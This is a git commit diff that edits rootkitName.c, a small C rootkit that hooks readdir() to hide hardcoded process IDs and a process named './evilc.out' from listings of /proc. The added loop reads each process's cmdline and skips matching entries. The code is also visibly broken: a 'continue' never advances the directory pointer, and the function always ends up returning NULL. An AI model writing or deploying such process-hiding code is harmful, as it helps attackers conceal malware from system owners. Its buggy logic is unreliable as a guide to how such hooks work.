919da98ff5adb9f7cf2c1b26335e3126122ae80a
master-saz <sebastian.andrade@ithinkupc.com>
2023-09-27 13:49:09 -0400

    update

--- rootkitName.c
+++ rootkitName.c
@@ -11,8 +11,7 @@
 static struct dirent *(*orig_readdir) (DIR *) = NULL;
 static const char* hide_process = "6592";
 static const char* hide_process2 = "6204";
-static const char* hidde_name = "evilc.out";
-//const int pid = getpid();
+static const char* hidde_name = "./evilc.out";
 
 struct dirent *readdir (DIR * dirp){
    if (orig_readdir == NULL){
@@ -24,10 +23,23 @@ struct dirent *readdir (DIR * dirp){
 
    struct dirent* ret = orig_readdir(dirp);
 
-   char buffer[256];
-   snprintf(buffer,sizeof(buffer),"/proc/%d/cmdline", ret->d_name);
-
-   while (ret != NULL && (strcmp(buffer, hidde_name) == 0)){
+   while (ret != NULL){
+      char tmp[256];
+      snprintf(tmp,sizeof(tmp),"/proc/%s/cmdline", ret->d_name);
+      //printf(tmp);
+      FILE* f = fopen(tmp,"r");
+      char proc_name[100];
+      if(f != NULL){
+         fgets(proc_name, 100, f);
+         //printf("%s\n", proc_name);
+         fclose(f);
+         if (strcmp(proc_name, hidde_name)==0){
+            //ret = orig_readdir (dirp);
+            continue;
+         }
+      }
+      //fclose(f);
+      //(strcmp(buffer, hidde_name) == 0)
       ret = orig_readdir (dirp);
    }
    return ret;
